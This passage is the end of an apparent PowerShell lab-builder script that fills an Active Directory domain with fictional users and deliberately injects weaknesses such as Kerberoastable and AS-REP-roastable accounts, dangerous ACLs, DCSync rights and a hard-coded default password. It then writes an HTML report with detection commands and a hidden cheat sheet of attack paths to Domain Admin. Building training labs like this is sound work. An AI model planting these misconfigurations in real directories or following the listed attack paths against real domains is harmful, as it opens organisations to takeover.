                <div class="stat-label">Villes/Bureaux</div>
            </div>
        </div>

        <div class="chart-container">
            <div class="chart">
                <h3>👥 Repartition par Ville</h3>
                $(foreach ($city in ($usersByCity | Select-Object -First 10)) {
                    $pct = [math]::Round(($city.Count / $totalUsers) * 100, 1)
                    "<div class='bar-label'><span>$($city.Name)</span><span>$($city.Count) ($pct%)</span></div><div class='bar' style='width: $($pct * 3)%'></div>"
                })
            </div>
            <div class="chart">
                <h3>🏛️ Repartition par Departement</h3>
                $(foreach ($dept in ($usersByDept | Select-Object -First 10)) {
                    $pct = [math]::Round(($dept.Count / $totalUsers) * 100, 1)
                    "<div class='bar-label'><span>$($dept.Name)</span><span>$($dept.Count) ($pct%)</span></div><div class='bar' style='width: $($pct * 3)%'></div>"
                })
            </div>
        </div>

        <h2>🔓 Vulnerabilites par Type</h2>
        <table>
            <thead>
                <tr><th>Type</th><th>Nombre</th><th>Description</th></tr>
            </thead>
            <tbody>
                $(foreach ($vt in $vulnByType) {
                    $desc = switch ($vt.Name) {
                        "PasswordNeverExpires" { "Mots de passe qui n'expirent jamais" }
                        "PasswordNotRequired" { "Comptes sans mot de passe requis" }
                        "ReversibleEncryption" { "Chiffrement reversible active" }
                        "ASREPRoastable" { "Vulnerable a AS-REP Roasting" }
                        "Kerberoastable" { "SPN on compte user - Kerberoastable" }
                        "UnconstrainedDelegation" { "Delegation Kerberos non contrainte" }
                        "ConstrainedDelegation" { "Delegation contrainte with transition" }
                        "ExcessivePrivileges_DA" { "Membre Domain Admins non legitime" }
                        "ExcessivePrivileges_AO" { "Membre Account Operators" }
                        "ExcessivePrivileges_BO" { "Membre Backup Operators" }
                        "ExcessivePrivileges_DNS" { "Membre DnsAdmins non-IT" }
                        "PasswordInDescription" { "Mot de passe in le champ description" }
                        "DisabledAccountInPrivGroup" { "Compte desactive in group privilegie" }
                        "SuspiciousAccountName" { "Nom de compte suspect (admin, test, tmp...)" }
                        "NestedGroupPath" { "Chemin indirect vers DA via groups imbriques" }
                        "StaleAccount" { "Compte potentiellement abandonne" }
                        "ACL_GenericAll_DA" { "GenericAll on Domain Admins" }
                        "ACL_WriteDACL_OU" { "WriteDACL on OUs" }
                        "ACL_GenericWrite_User" { "GenericWrite on users privilegies" }
                        "ACL_ForceChangePassword" { "ForceChangePassword on admins" }
                        "ACL_AddMember" { "AddMember on groups privilegies" }
                        "ACL_DCSync" { "DCSync rights on le domaine" }
                        default { $vt.Name }
                    }
                    "<tr><td>$($vt.Name)</td><td>$($vt.Count)</td><td>$desc</td></tr>"
                })
            </tbody>
        </table>

        <h2>⚠️ Vulnerabilites par Severite</h2>
        <div class="stats-grid">
            $(foreach ($sev in $vulnBySeverity) {
                $class = switch ($sev.Name) { "Critical" { "danger" } "High" { "warning" } default { "" } }
                "<div class='stat-card $class'><div class='stat-number'>$($sev.Count)</div><div class='stat-label'>$($sev.Name)</div></div>"
            })
        </div>

        <h2>🔍 Commandes de Detection</h2>
        <div class="chart">
            <h3>PowerShell - Detection des vulnerabilites</h3>

            <h4>Mots de passe n'expirant jamais:</h4>
            <div class="detection-cmd">Get-ADUser -Filter {PasswordNeverExpires -eq `$true -and Enabled -eq `$true} -Properties PasswordNeverExpires | Select-Object Name, SamAccountName</div>

            <h4>Comptes sans pre-authentification (AS-REP Roastable):</h4>
            <div class="detection-cmd">Get-ADUser -Filter {DoesNotRequirePreAuth -eq `$true} -Properties DoesNotRequirePreAuth | Select-Object Name, SamAccountName</div>

            <h4>Comptes Kerberoastables (SPN on users):</h4>
            <div class="detection-cmd">Get-ADUser -Filter {ServicePrincipalNames -like "*"} -Properties ServicePrincipalNames | Select-Object Name, SamAccountName, ServicePrincipalNames</div>

            <h4>Delegation non contrainte:</h4>
            <div class="detection-cmd">Get-ADUser -Filter {TrustedForDelegation -eq `$true} -Properties TrustedForDelegation | Select-Object Name, SamAccountName</div>

            <h4>Membres Domain Admins:</h4>
            <div class="detection-cmd">Get-ADGroupMember "Domain Admins" -Recursive | Get-ADUser -Properties Title, Department | Select-Object Name, SamAccountName, Title, Department</div>

            <h4>Mots de passe in description:</h4>
            <div class="detection-cmd">Get-ADUser -Filter * -Properties Description | Where-Object {`$_.Description -match "pass|pwd|mot de passe"} | Select-Object Name, Description</div>

            <h4>Comptes desactives in groups privilegies:</h4>
            <div class="detection-cmd">@("Domain Admins","Account Operators","Backup Operators") | ForEach-Object { Get-ADGroupMember `$_ | Get-ADUser | Where-Object {-not `$_.Enabled} }</div>
        </div>

        <!-- SECTION CACHeE - CHEAT SHEET AUDIT -->
        <div id="audit-answers" class="hidden">
            <h2>🎯 CHEAT SHEET AUDIT (Section cachee)</h2>

            <h3>users vulnerables par categorie:</h3>
            $(foreach ($vt in $vulnByType) {
                $users = $script:Config.Vulnerabilities | Where-Object { $_.Type -eq $vt.Name } | Select-Object -ExpandProperty User -Unique
                "<h4>$($vt.Name) ($($vt.Count)):</h4><ul>$(foreach ($u in $users) { "<li>$u</li>" })</ul>"
            })

            <h3>Chemins d'attaque vers Domain Admin:</h3>
            <ol>
                <li><strong>Direct:</strong> users non legitimes in Domain Admins</li>
                <li><strong>Nested Groups:</strong> GS-IT-Helpdesk-Elevated → GS-IT-SysOps → GS-IT-Infrastructure → Domain Admins</li>
                <li><strong>ACL Abuse:</strong> GenericAll/WriteDACL/AddMember on Domain Admins</li>
                <li><strong>DCSync:</strong> users with droits de replication</li>
                <li><strong>Kerberoast:</strong> Crack SPN, escalade via compte de service</li>
                <li><strong>AS-REP Roast:</strong> Crack hash offline, pivot</li>
                <li><strong>Password in Description:</strong> Recuperation directe de credentials</li>
            </ol>

            <h3>Score d'audit attendu:</h3>
            <table>
                <tr><th>Categorie</th><th>Vulnerabilites a trouver</th><th>Points</th></tr>
                <tr><td>Comptes privilegies excessifs</td><td>~15-20</td><td>30</td></tr>
                <tr><td>Kerberos attacks (AS-REP + Kerberoast)</td><td>~20-30</td><td>20</td></tr>
                <tr><td>Problemes de mot de passe</td><td>~50-80</td><td>15</td></tr>
                <tr><td>ACLs dangereuses</td><td>~25-30</td><td>25</td></tr>
                <tr><td>Comptes suspects/stale</td><td>~30-50</td><td>10</td></tr>
            </table>
        </div>

        <button class="toggle-btn" onclick="document.getElementById('audit-answers').classList.toggle('hidden')">
            🔐 Afficher/Masquer le Cheat Sheet Audit
        </button>

        <h2>📈 Hierarchie des Managers</h2>
        <table>
            <thead>
                <tr><th>Niveau</th><th>Nombre</th><th>Description</th></tr>
            </thead>
            <tbody>
                <tr><td>Executives (C-Level)</td><td>$(($script:AllUsers | Where-Object { $_.IsExecutive }).Count)</td><td>CEO, CFO, CTO, etc.</td></tr>
                <tr><td>Managers</td><td>$(($script:AllUsers | Where-Object { $_.IsManager -and -not $_.IsExecutive }).Count)</td><td>Managers de departement par ville</td></tr>
                <tr><td>Team Leads</td><td>$(($script:AllUsers | Where-Object { $_.IsTeamLead }).Count)</td><td>Leads d'equipe</td></tr>
                <tr><td>Employes</td><td>$(($script:AllUsers | Where-Object { -not $_.IsManager -and -not $_.IsTeamLead -and -not $_.IsExecutive }).Count)</td><td>Contributeurs individuels</td></tr>
            </tbody>
        </table>

        <footer>
            <p>🤖 Genere par Claude Code (Anthropic) - Script Populate-AD-GlobalCorp.ps1</p>
            <p>Duree d'execution: $([math]::Round(((Get-Date) - $script:Config.StartTime).TotalMinutes, 2)) minutes</p>
        </footer>
    </div>
</body>
</html>
"@

    $html | Out-File -FilePath $htmlPath -Encoding UTF8
    Write-Log "HTML exporte: $htmlPath" "SuccessS"

    # =========================================================================
    # RAPPORT VULNeRABILITeS CSV
    # =========================================================================
    $vulnCsvPath = Join-Path $OutputPath "GlobalCorp_Vulnerabilities_$timestamp.csv"

    $script:Config.Vulnerabilities | ForEach-Object {
        [PSCustomObject]@{
            Type = $_.Type
            User = $_.User
            Target = $_.Target
            Severity = $_.Severity
            Description = $_.Description
            Detection = $_.Detection
        }
    } | Export-Csv -Path $vulnCsvPath -NoTypeInformation -Encoding UTF8

    Write-Log "CSV vulnerabilites exporte: $vulnCsvPath" "SuccessS"

    return @{
        UsersCsv = $csvPath
        VulnCsv = $vulnCsvPath
        HtmlReport = $htmlPath
    }
}

# ============================================================================
# FONCTION PRINCIPALE
# ============================================================================

function Start-GlobalCorpPopulation {
    Clear-Host

    Write-Host @"

    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║   ██████╗ ██╗      ██████╗ ██████╗  █████╗ ██╗      ██████╗ ██████╗ ██████╗ ██████╗   ║
    ║  ██╔════╝ ██║     ██╔═══██╗██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗██╔══██╗██╔══██╗  ║
    ║  ██║  ███╗██║     ██║   ██║██████╔╝███████║██║     ██║     ██║   ██║██████╔╝██████╔╝  ║
    ║  ██║   ██║██║     ██║   ██║██╔══██╗██╔══██║██║     ██║     ██║   ██║██╔══██╗██╔═══╝   ║
    ║  ╚██████╔╝███████╗╚██████╔╝██████╔╝██║  ██║███████╗╚██████╗╚██████╔╝██║  ██║██║       ║
    ║   ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝       ║
    ║                                                                  ║
    ║           AD Population Script - Security Lab Edition            ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor Cyan

    # Demander les parametres si non fournis
    if (-not $OnlyVulnerabilities -and -not $SkipUserCreation) {
        if (-not $TotalUsers) {
            do {
                $TotalUsers = Read-Host "Total number of users to create (min 100)"
                $TotalUsers = [int]$TotalUsers
            } while ($TotalUsers -lt 100)
        }
    }

    if (-not $DefaultPassword) {
        $DefaultPassword = Read-Host "Default password for users (ex: Welcome2024!)"
        if ([string]::IsNullOrEmpty($DefaultPassword)) {
            $DefaultPassword = "Welcome2024!"
        }
    }

    if (-not $OutputPath -or $OutputPath -eq "C:\ADPopulate_Reports") {
        $customPath = Read-Host "Chemin for les rapports (Entree for C:\ADPopulate_Reports)"
        if (-not [string]::IsNullOrEmpty($customPath)) {
            $OutputPath = $customPath
        }
    }

    # Stocker parametres en variables script pour acces dans les fonctions
    $script:VulnPercent = $VulnPercent
    $script:VulnUserCount = $VulnUserCount
    $script:UltraVulnUsers = $UltraVulnUsers
    $script:UltraVulnMin = $UltraVulnMin
    $script:UltraVulnMax = $UltraVulnMax
    $script:TotalComputers = $TotalComputers
    $script:VulnComputerPercent = $VulnComputerPercent

    Write-Host ""
    Write-Host "Configuration:" -ForegroundColor Yellow
    if ($OnlyVulnerabilities -or $SkipUserCreation) {
        Write-Host "  - Mode: OnlyVulnerabilities" -ForegroundColor Magenta
    } else {
        Write-Host "  - users a creer: $TotalUsers" -ForegroundColor White
    }
    if ($TotalComputers -gt 0) {
        Write-Host "  - Ordinateurs a creer: $TotalComputers (Vulns: $VulnComputerPercent%)" -ForegroundColor Cyan
    }
    Write-Host "  - Mot de passe par defaut: $DefaultPassword" -ForegroundColor White
    Write-Host "  - Chemin rapports: $OutputPath" -ForegroundColor White
    Write-Host "  - Domaine: $($script:Config.Domain)" -ForegroundColor White

    # Affichage dynamique des vulns
    if ($VulnUserCount -gt 0) {
        Write-Host "  - Vulnerabilites: $VulnUserCount users (mode absolu)" -ForegroundColor Red
    } else {
        Write-Host "  - Vulnerabilites: $VulnPercent% des users" -ForegroundColor Red
    }

    if ($UltraVulnUsers -gt 0) {
        Write-Host "  - Ultra-vulnerable users: $UltraVulnUsers (range: $UltraVulnMin-$UltraVulnMax vulns)" -ForegroundColor Magenta
    }
    Write-Host ""

    if (-not $script:AutoConfirm) {
        $confirmInput = Read-Host "Continuer? (O/N)"
        if ($confirmInput -ne "O" -and $confirmInput -ne "o") {
            Write-Host "Operation annulee." -ForegroundColor Yellow
            return
        }
    } else {
        Write-Host "Auto-confirmation activee, demarrage..." -ForegroundColor Green
    }

    $securePassword = ConvertTo-SecureString $DefaultPassword -AsPlainText -Force

    Write-Host ""
    Write-Log "Demarrage du peuplement AD GlobalCorp..." "INFO"
    Write-Log "Heure de debut: $(Get-Date -Format 'HH:mm:ss')" "INFO"

    # Si OnlyVulnerabilities, charger les users existants et injecter les vulns
    if ($OnlyVulnerabilities -or $SkipUserCreation) {
        Write-Log "Mode OnlyVulnerabilities - Chargement des users existants..." "INFO"

        # Charger tous les users de GlobalCorp
        $existingUsers = Get-ADUser -Filter * -SearchBase "OU=$($script:Config.RootOU),$($script:Config.DomainDN)" -Properties Department,Title,City,EmployeeID,EmployeeType

        Write-Log "Trouve $($existingUsers.Count) users existants" "INFO"

        # Convertir en format script
        $script:AllUsers = @()
        foreach ($user in $existingUsers) {
            $userInfo = @{
                SamAccountName = $user.SamAccountName
                DisplayName = $user.DisplayName
                UPN = $user.UserPrincipalName
                Department = $user.Department
                City = $user.City
                Role = $user.Title
                EmployeeID = $user.EmployeeID
                EmployeeType = if ($user.employeeType) { $user.employeeType } else { "Full-Time" }
                IsManager = $user.Title -like "*Manager*"
                IsTeamLead = $user.Title -like "*Lead*"
                IsDirector = $user.Title -like "*Director*"
                IsExecutive = $user.Department -eq "Executive"
                Password = $DefaultPassword
                Vulnerable = $false
                VulnType = @()
            }
            $script:AllUsers += $userInfo
        }

        # etape 6: Injectings vulnerabilites
        Add-SecurityVulnerabilities -Users $script:AllUsers -PlainPassword $DefaultPassword

        # etape 7: ACLs dangereuses
        Add-DangerousACLs

        # etape 7b: Creatings ordinateurs (si demande)
        if ($script:TotalComputers -gt 0) {
            Write-Log "=== Creatings ordinateurs ===" "INFO"
            $computers = New-ADComputers -ComputerCount $script:TotalComputers
            if ($computers) {
                Add-ComputerVulnerabilities -Computers $computers
            }
        }

        # etape 8: Generatings rapports
        $reports = Export-Reports -OutputPath $OutputPath

    } else {
        # Mode normal - creer tout

        # etape 1: Structure OU
        if (-not (New-GlobalCorpOUStructure)) {
            Write-Log "echec de la Creating OU structure. Arret." "ERROR"
            return
        }

        # etape 2: groups
        if (-not (New-GlobalCorpGroups)) {
            Write-Log "echec de la Creatings groups. Arret." "ERROR"
            return
        }

        # etape 3: Distribution des users
        $distribution = Get-UserDistribution -TotalUsers $TotalUsers

        # etape 4: Creatings users
        $users = New-GlobalCorpUsers -Distribution $distribution -SecurePassword $securePassword -PlainPassword $DefaultPassword

        # etape 5: Hierarchie des managers
        Set-ManagerHierarchy

        # etape 6: Injectings vulnerabilites
        Add-SecurityVulnerabilities -Users $script:AllUsers -PlainPassword $DefaultPassword

        # etape 7: ACLs dangereuses
        Add-DangerousACLs

        # etape 7b: Creatings ordinateurs (si demande)
        if ($script:TotalComputers -gt 0) {
            Write-Log "=== Creatings ordinateurs ===" "INFO"
            $computers = New-ADComputers -ComputerCount $script:TotalComputers
            if ($computers) {
                Add-ComputerVulnerabilities -Computers $computers
            }
        }

        # etape 8: Generatings rapports
        $reports = Export-Reports -OutputPath $OutputPath
    }

    # Resume final
    Write-Host ""
    Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Green
    Write-Log "PEUPLEMENT AD Completed!" "SuccessS"
    Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Statistiques:" -ForegroundColor Cyan
    Write-Host "    - users crees: $($script:AllUsers.Count)" -ForegroundColor White
    Write-Host "    - OUs creees: $($script:Config.CreatedOUs.Count)" -ForegroundColor White
    Write-Host "    - groups crees: $($script:Config.CreatedGroups.Count)" -ForegroundColor White
    Write-Host "    - Vulnerabilites injectees: $($script:Config.Vulnerabilities.Count)" -ForegroundColor Red
    Write-Host "    - Errors: $($script:Config.Errors.Count)" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  Rapports generes:" -ForegroundColor Cyan
    Write-Host "    - CSV users: $($reports.UsersCsv)" -ForegroundColor White
    Write-Host "    - CSV Vulnerabilites: $($reports.VulnCsv)" -ForegroundColor White
    Write-Host "    - Rapport HTML: $($reports.HtmlReport)" -ForegroundColor White
    Write-Host ""
    Write-Host "  Duree totale: $([math]::Round(((Get-Date) - $script:Config.StartTime).TotalMinutes, 2)) minutes" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Green

    # Ouvrir HTML report
    if (-not $script:NoOpenReport) {
        $openReport = Read-Host "Ouvrir HTML report? (O/N)"
        if ($openReport -eq "O" -or $openReport -eq "o") {
            Start-Process $reports.HtmlReport
        }
    }
}

# ============================================================================
# EXeCUTION
# ============================================================================

# Passer les parametres au scope script
$script:AutoConfirm = $Confirm
$script:NoOpenReport = $NoOpenReport

# Si le script est execute directement (pas importe comme module)
if ($MyInvocation.InvocationName -ne '.') {
    Start-GlobalCorpPopulation
}
